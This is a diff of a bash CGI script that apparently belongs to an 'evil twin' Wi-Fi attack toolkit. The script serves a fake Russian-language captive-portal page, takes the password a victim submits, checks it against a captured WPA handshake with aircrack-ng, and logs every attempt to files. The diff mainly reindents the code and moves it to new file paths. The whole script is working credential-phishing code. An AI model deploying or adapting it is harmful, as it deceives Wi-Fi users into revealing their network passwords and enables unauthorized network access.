@@ -10,45 +10,46 @@ echo -e '\t</head>'
 echo -e '\t<body>'
 echo -e '\t\t<div class="content">'
 echo -e '\t\t\t<center><p>'
+
 POST_DATA=$(cat /dev/stdin)
 if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
-POST_DATA=${POST_DATA#*=}
-password=${POST_DATA/+/ }
-password=${password//[*&\/?<>]}
-password=$(printf '%b' "${password//%/\\x}")
-password=${password//[*&\/?<>]}
+  POST_DATA=${POST_DATA#*=}
+  password=${POST_DATA/+/ }
+  password=${password//[*&\/?<>]}
+  password=$(printf '%b' "${password//%/\\x}")
+  password=${password//[*&\/?<>]}
 fi
 
 if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
-rm -rf "/tmp/www/currentpass.txt" > /dev/null 2>&1
-echo "${password}" >\
-"/tmp/www/currentpass.txt"
-if [ "$(timeout 1.5 bash -c "aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w '/tmp/www/currentpass.txt' '/usr/share/wef/main/captures/XXXXXXX/XXXXXXXXXX.cap' 2>/dev/null | grep 'KEY FOUND'")" ]; then
-touch "/tmp/www/success.txt" > /dev/null 2>&1
-echo 'Пароль верен, подключение устанавливается'
-et_successful=1
-else
-echo "${password}" >>\
-"/tmp/www/attempts.txt"
-echo 'Неправильный пароль, возврат на главную страницу'
-et_successful=0
-fi
+  rm -rf "/usr/share/wef/cache/www/evil_twin_currentpass.txt" > /dev/null 2>&1
+  echo "${password}" > "/usr/share/wef/cache/www/evil_twin_currentpass.txt"
+  if [ "$(timeout 1.5 bash -c "aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w '/usr/share/wef/cache/www/evil_twin_currentpass.txt' '/usr/share/wef/output/XXXXXXXX/XXXXXXXXXX.cap' 2>/dev/null | grep 'KEY FOUND'")" ]; then
+    touch "/usr/share/wef/cache/www/evil_twin_success.txt" > /dev/null 2>&1
+    echo 'Пароль верен, подключение устанавливается'
+    et_successful=1
+  else
+    echo "${password}" >> "/usr/share/wef/cache/www/evil_twin_attempts.txt"
+    echo 'Неправильный пароль, возврат на главную страницу'
+    et_successful=0
+  fi
 elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
-echo 'Ошибка. В пароле должно быть не менее 8 символов. Перенаправление на главную страницу'
-et_successful=0
+  echo 'Ошибка. В пароле должно быть не менее 8 символов. Перенаправление на главную страницу'
+  et_successful=0
 else
-echo 'Непредвиденная ошибка, перенаправление на главную страницу'
-et_successful=0
+  echo 'Непредвиденная ошибка, перенаправление на главную страницу'
+  et_successful=0
 fi
+
 echo -e '\t\t\t</p></center>'
 echo -e '\t\t</div>'
 echo -e '\t</body>'
 echo '</html>'
+
 if [ "${et_successful}" -eq 1 ]; then
-exit 0
+  exit 0
 else
-echo '<script type="text/javascript">'
-echo -e '\tsetTimeout("redirect()", 3500);'
-echo '</script>'
-exit 1
+  echo '<script type="text/javascript">'
+  echo -e '\tsetTimeout("redirect()", 3500);'
+  echo '</script>'
+  exit 1
 fi
